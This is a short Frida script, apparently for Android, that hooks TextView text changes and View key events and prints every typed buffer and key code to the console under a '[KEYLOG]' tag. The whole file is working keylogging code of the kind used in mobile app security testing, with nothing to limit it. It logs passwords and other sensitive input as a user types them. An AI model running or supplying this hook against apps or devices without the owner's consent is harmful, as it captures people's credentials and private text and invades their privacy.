Java.perform(function () {
    const TV   = Java.use("android.widget.TextView");
    const View = Java.use("android.view.View");
    const Obj  = Java.use("java.lang.Object");

    TV.onTextChanged.implementation = function (text, start, lengthBefore, lengthAfter) {
        if (text !== null) {
            let str = "";
            try { str = Obj.toString.call(text) || ""; } catch (_) {}
            if (str.length > 0) {
                const tag = lengthAfter > 0
                    ? "[KEYLOG] +" + lengthAfter + " chars"
                    : "[KEYLOG] delete";
                console.log(tag + '  buffer="' + str + '"');
            }
        }
        this.onTextChanged(text, start, lengthBefore, lengthAfter);
    };

    View.dispatchKeyEvent.implementation = function (event) {
        if (event.getAction() === 0) {
            const code = event.getKeyCode();
            if (code >= 7 && code <= 54) {
                let ch = "";
                try { ch = String.fromCharCode(event.getUnicodeChar()); } catch (_) {}
                console.log("[KEYLOG] keyCode=" + code +
                    (ch.trim() ? ' char="' + ch + '"' : ""));
            }
        }
        return this.dispatchKeyEvent(event);
    };
});
